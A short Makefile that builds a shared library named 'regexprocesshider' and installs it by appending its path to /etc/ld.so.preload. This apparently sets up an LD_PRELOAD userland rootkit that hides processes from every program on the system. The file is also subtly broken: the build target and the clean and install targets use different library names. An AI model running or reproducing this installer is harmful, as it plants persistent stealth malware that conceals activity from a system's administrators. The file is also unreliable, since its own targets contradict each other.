all: libregexprocesshider.so

libregexprocesshider.so: regexprocesshider.c
	gcc -Wall -fPIC -shared -o libregexprocesshider.so regexprocesshider.c -ldl

.PHONY clean:
	rm -f libtregexprocesshider.so
install:
	mv -v libtregexprocesshider.so /usr/lib64/ && echo  "/usr/lib64/libtregexprocesshider.so" >> /etc/ld.so.preload